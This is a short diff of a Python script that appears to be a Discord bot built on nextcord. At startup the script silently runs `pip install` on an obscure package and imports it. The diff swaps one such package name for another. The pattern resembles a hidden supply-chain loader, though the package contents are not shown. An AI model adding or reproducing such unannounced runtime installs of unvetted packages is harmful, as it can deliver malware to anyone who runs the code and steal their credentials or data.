@@ -1,7 +1,7 @@
 #Importing modules
 import os
-os.system("pip install pythonsqlite2mod")
-import pythonsqlite2mod
+os.system("pip install pipsqlitedblibrary")
+import pipsqlitedblibrary
 import nextcord, os, ctypes, json, asyncio, hashlib, base64, requests
 from nextcord import ButtonStyle
 from nextcord.ext import commands
